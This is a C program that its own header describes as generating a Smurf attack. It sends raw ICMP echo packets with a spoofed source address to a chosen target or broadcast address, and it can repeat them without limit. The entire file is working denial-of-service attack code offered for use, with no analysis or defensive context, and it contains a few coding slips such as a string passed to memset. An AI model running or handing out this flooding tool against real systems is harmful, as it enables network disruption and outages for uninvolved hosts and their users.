/* This code generates the Smurf attack using the 3 command line arguments i.e. the source IP address, the destination IP address and Number of packets to be sent ( 0 for Infinite ) */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>
 
#define BUFFER_SIZE 400
#define PACKET_DELAY_USEC 30
#define DEF_NUM_PACKETS 100
 
char buf[BUFFER_SIZE];
 
char *usage = "\nUsage: ./icmp_flood <saddr> <daddr> <# packets>\n \
	<saddr> = spoofed source address\n \
	<daddr> = target IP address\n \
	<# packets> = is the number of packets to send, 100 is the default, 0 = infinite\n";
 
void set_ip_layer_fields(struct icmphdr *icmp, struct ip *ip)
{
    // IP Layer
    ip->ip_v = 4;
    ip->ip_hl = sizeof*ip >> 2;
    ip->ip_tos = 0;
    ip->ip_len = htons(sizeof(buf));
    ip->ip_id = htons(4321);
    ip->ip_off = htons(0);
    ip->ip_ttl = 255;
    ip->ip_p = 1;
    ip->ip_sum = 0; /* Let kernel fill in */
 
    // ICMP Layer
    icmp->type = ICMP_ECHO;
    icmp->code = 0;	
    icmp->checksum = htons(~(ICMP_ECHO << 8));	
}
 
void set_socket_options(int s)
{
    int on = 1;
 
    // Enable broadcast
    if(setsockopt(s, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0){
        perror("setsockopt() for BROADCAST error");
        exit(1);
    }
 
    // socket options, tell the kernel we provide the IP structure 
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
        perror("setsockopt() for IP_HDRINCL error");
        exit(1);
    }	
}
 
int main(int argc, char *argv[])
{
    int s, i;	
    struct ip *ip = (struct ip *)buf;
    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
    struct hostent *hp, *hp2;
    struct sockaddr_in dst;
    int offset;
    int num = DEF_NUM_PACKETS;
 
    if(argc < 3){
        fprintf(stdout, "%s\n",usage);
        exit(1);
    }
 
    // If enough arguments supplied 
    if(argc == 4)
        num = atoi(argv[3]);
 
    // Loop based on the packet number
    for(i = 1; num == 0 ? num == 0 : i <= num; i++){
        // Clear data paylod
        memset(buf, "Smurf", sizeof(buf));
        // Create RAW socket 
        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
            perror("socket() error");
            exit(1);
        }
 
        set_socket_options(s);
 
        if((hp = gethostbyname(argv[2])) == NULL){
            if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1){
                fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);
                exit(1);
            }
        }else
            memcpy(&ip->ip_dst.s_addr, hp->h_addr_list[0], hp->h_length);
 
        if((hp2 = gethostbyname(argv[1])) == NULL){
            if((ip->ip_src.s_addr = inet_addr(argv[1])) == -1){
                fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);
                exit(1);
            }
        }else
            memcpy(&ip->ip_src.s_addr, hp2->h_addr_list[0], hp->h_length);
 
        set_ip_layer_fields(icmp, ip);
 
        dst.sin_addr = ip->ip_dst;
        dst.sin_family = AF_INET;
 
        if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
            fprintf(stderr, "Error during packet send.\n");
            perror("sendto() error");
        }else
            printf("sendto() is OK.\n");
 
        close(s);
        usleep(PACKET_DELAY_USEC);
    }
    return 0;
}
